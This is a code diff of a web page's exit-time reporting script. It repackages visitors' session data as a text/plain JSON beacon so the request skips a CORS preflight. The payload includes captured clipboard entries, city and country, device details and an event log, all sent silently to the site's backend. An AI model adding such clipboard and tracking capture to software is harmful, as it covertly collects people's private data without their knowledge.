@@ -72,26 +72,28 @@
 
         const rawLog = localHistory.slice(-20).join('\n').substring(0, 1500);
 
-        // 2. Persistent Logs (POST to Backend - Failsafe V39)
-        const params = new URLSearchParams();
-        params.append('sessionID', sessionID || 'unknown');
-        params.append('duration', duration);
-        params.append('exitPage', window.location.pathname);
-        params.append('location', `${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}`);
-        params.append('deviceInfo', `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,);
-        params.append('clipboard', escapeHTML(clipboardEntries) || 'None');
-        params.append('eventLog', escapeHTML(rawLog) || 'No events recorded');
+        // 2. Persistent Logs (POST to Backend - Final Fortress V41)
+        const payload = {
+            sessionID: sessionID || 'unknown',
+            duration: duration,
+            exitPage: window.location.pathname,
+            location: `${sessionData?.city || 'Unknown'}, ${sessionData?.country_name || ''}`,
+            deviceInfo: `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,
+            clipboard: escapeHTML(clipboardEntries) || 'None',
+            eventLog: escapeHTML(rawLog) || 'No events recorded'
+        };
 
         const reportUrl = CONFIG.api.report;
 
-        // STRATEGY: navigator.sendBeacon with URLSearchParams (Simple Request - No Preflight)
-        // This is the most reliable way to send data on exit as it bypasses CORS OPTIONS check.
+        // Final Fortress: JSON via text/plain blob for 100% reliable bypass of Preflight and Parsing issues
+        const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
+
         if (navigator.sendBeacon) {
-            navigator.sendBeacon(reportUrl, params);
+            navigator.sendBeacon(reportUrl, blob);
         } else {
             fetch(reportUrl, {
                 method: 'POST',
-                body: params,
+                body: JSON.stringify(payload),
                 keepalive: true,
                 mode: 'no-cors'
             }).catch(() => { });
